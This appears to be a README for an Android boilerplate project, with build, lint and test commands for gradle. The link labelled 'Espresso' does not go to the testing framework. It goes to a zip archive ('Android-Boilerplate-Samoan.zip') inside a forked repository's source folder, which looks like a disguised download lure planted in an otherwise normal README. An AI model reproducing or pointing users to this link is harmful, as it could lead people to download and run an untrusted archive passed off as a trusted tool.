A simple boilerplate application which demonstrates the downloading, persisting and syncing of data - displayed with a common layout used amongst applications.

The project is setup using:

- Functional tests with [Espresso](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)

Building
--------

To build, install and run a debug version, run this from the root of the project:

    ./gradlew installRunDebug
    
Testing
--------

For Android Studio to use syntax highlighting for Automated tests and Unit tests you **must** switch the Build Variant to the desired mode.

To run **pmd**, **checkstyle** and **findbug** checks on your machine:

    ./gradlew check

To run **unit** tests on your machine:

    ./gradlew testDebugUnitTest
    
To run **automated** tests on connected devices:

    ./gradlew connectedDebugAndroidTest
